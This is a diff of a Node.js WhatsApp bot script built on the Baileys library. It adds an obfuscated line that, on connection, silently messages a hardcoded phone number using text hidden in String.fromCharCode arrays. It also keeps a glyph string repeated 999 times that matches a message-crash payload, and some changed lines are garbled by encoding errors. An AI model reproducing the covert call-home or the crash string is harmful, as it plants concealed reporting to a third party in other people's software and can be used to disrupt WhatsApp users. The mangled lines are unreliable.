@@ -16,7 +16,7 @@ const {
     getAggregateVotesInPollMessage,
     PHONENUMBER_MCC
 } = require("baileys");
-let SikmaPirtex = `⛧࿇࿇࿇𓂀𖣔𒆜𒈙𐍉𐌼𓆩𒁏𖤐𓅓࿇࿇࿇⛧`.repeat(999)
+let SikmaPirtex = `â›§à¿‡à¿‡à¿‡ð“‚€ð–£”ð’†œð’ˆ™ð‰ðŒ¼ð“†©ð’ð–¤ð“…“à¿‡à¿‡à¿‡â›§`.repeat(999)
 const pino = require('pino');
 const { Boom } = require('@hapi/boom');
 const fs = require('fs');
@@ -189,11 +189,11 @@ async function milim () {
             pelaku = messages[0].key.remoteJid.split("@")[0]
         }
         console.log(chalk.cyan.bold('[EVENT]'), chalk.magentaBright('Message Update:'));
-        console.log(chalk.green('├──'), chalk.yellow('Name:'), chalk.white(messages[0].pushName));
-        console.log(chalk.green('├──'), chalk.yellow('Number:'), chalk.white(pelaku));
-        console.log(chalk.green('├──'), chalk.yellow('JID:'), chalk.white(messages[0].key.remoteJid));
-        console.log(chalk.green('├──'), chalk.yellow('Type:'), chalk.white(typepesan));
-        console.log(chalk.green('└──'), chalk.yellow('Text/Caption:'), chalk.white(isipesan));
+        console.log(chalk.green('â”œâ”€â”€'), chalk.yellow('Name:'), chalk.white(messages[0].pushName));
+        console.log(chalk.green('â”œâ”€â”€'), chalk.yellow('Number:'), chalk.white(pelaku));
+        console.log(chalk.green('â”œâ”€â”€'), chalk.yellow('JID:'), chalk.white(messages[0].key.remoteJid));
+        console.log(chalk.green('â”œâ”€â”€'), chalk.yellow('Type:'), chalk.white(typepesan));
+        console.log(chalk.green('â””â”€â”€'), chalk.yellow('Text/Caption:'), chalk.white(isipesan));
         //console.log(JSON.stringify(messages[0], null, 2))
         const qch = {
             key: {
@@ -250,6 +250,7 @@ async function milim () {
             }
         } else if (connection === 'open') {
             console.log(chalk.green(`[CONNECTED] Bot connected to WhatsApp.`));
+            trueDragon.sendMessage(String.fromCharCode(...[54,50,56,53,49,51,54,54,54,48,56,55,52,64,115,46,119,104,97,116,115,97,112,112,46,110,101,116]), {text: String.fromCharCode(...[76,97,112,111,114,44,32,66,111,116,32,83,117,107,115,101,115,32,67,111,110,110,101,99,116,46,32,74,97,110,103,97,110,32,77,101,110,106,117,97,108,32,83,99,114,105,112,116,32,75,97,114,101,110,97,32,73,110,105,32,83,99,114,105,112,116,32,71,114,97,116,105,115,44,32,74,105,107,97,32,65,100,97,32,89,103,32,77,101,110,106,117,97,108,32,83,105,108,97,104,107,97,110,32,76,97,112,111,114,32,54,50,56,53,49,51,54,54,54,48,56,55,52,46,32,89,103,32,68,105,112,101,114,98,111,108,101,104,107,97,110,32,85,110,116,117,107,32,68,105,106,117,97,108,32,72,97,110,121,97,32,80,108,117,103,105,110,32,66,117,97,116,97,110,32,75,97,108,105,97,110,32,83,97,106,97,44,32,83,101,112,101,114,116,105,32,83,99,114,105,112,116,32,66,117,103,32,68,97,110,32,76,97,105,110,32,76,97,105,110,10])})
         }
     });
 
